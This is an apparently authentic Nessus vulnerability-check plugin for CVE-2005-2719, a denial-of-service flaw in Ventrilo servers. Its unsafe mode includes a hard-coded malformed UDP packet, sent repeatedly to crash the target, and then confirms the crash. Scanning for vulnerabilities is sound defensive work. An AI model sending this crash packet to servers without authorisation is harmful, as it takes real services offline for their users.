#
# Josh Zlatin-Amishav and Boaz Shatz
# GPLv2
#


 desc["english"] = "
Synopsis :

The remote Ventrilo service can be disabled remotely.

Description :

A malicious user can crash the remote version of Ventrilo due to a 
vulnerability in the way the server handles malformed status queries.

See also : 

http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0763.html

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:A)";


if(description)
{
 script_id(19757);
 script_version ("$Revision: 1.4 $");
 script_bugtraq_id(14644);
 script_cve_id("CVE-2005-2719");
 if (defined_func("script_xref")) 
 {
   script_xref(name:"OSVDB", value:"18946");
 }

 name["english"] = "Ventrilo Server Malformed Status Query Remote DoS";
 script_name(english:name["english"]);

 script_description(english:desc["english"]);

 summary["english"] = "Sends malformed status query requests";
 script_summary(english:summary["english"]);

 script_category(ACT_MIXED_ATTACK);

 script_copyright(english:"Copyright (C) 2005 Josh Zlatin-Amishav");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("ventrilo_detect.nasl");
 script_require_ports("Services/ventrilo", 3784);

 exit(0);
}

# Make sure we're really looking at a Ventrilo server.
version = get_kb_item("Ventrilo/version");
if ( ! version ) exit(0);

port = get_kb_item("Services/ventrilo");
if (!port) port = 3784;
if(!get_udp_port_state(port))exit(0);

if ( safe_checks() )
{
  if ( ereg(pattern:"^2\.(1\.[2-9]|2\.|3\.0($|[^0-9.]))", string:version) )
  {
    security_warning(port);
  }
    exit(0);
}
else
{
  # A packet to crash the server.
  pkt_dos = raw_string( 0x4c,0xe3,0xdd,0x25,0xf2,0xa6,0xe7,0xb8,0x66,0x76,
                        0x22,0xf0,0xfd,0xba,0x01,0xc9,0xef,0x15,0x5e,0x55
                      );
		      
  # A packet to request the server's status.
  pkt_status = raw_string( 0x6f,0x03,0xae,0x41,0x77,0x87,0x7d,0x8c,0x65,
                           0xea,0x22,0x0b,0xf8,0xa2,0xbc,0x03,0xa5,0x0a,
			   0xf6,0xb0,0x36,0xe0,0x93,0xd0,0x4e,0x82,0x1b,
			   0xb8,0x19,0x6f,0x91,0x3a,0x7f,0x04,0xe7,0x07
			 );

  # Try a couple of times to crash it.
  tries = 5;
  for (iter = 0; iter < tries; iter++) 
  {
    soc = open_sock_udp(port);
    send(socket:soc, data:pkt_dos);
  }

  # Try a couple of times to get the status.
  for (iter = 0; iter < tries; iter++) 
  {
    soc = open_sock_udp(port);
    send(socket:soc, data:pkt_status);

    buff = recv(socket:soc, length:512);
    # A response to the status request means the server didn't crash.
    if (buff) exit(0);
    sleep(1);
  }

  # No response to the status request -- assume it's down.
  security_warning(port:port, protocol:"udp", data:desc["english"]);
}
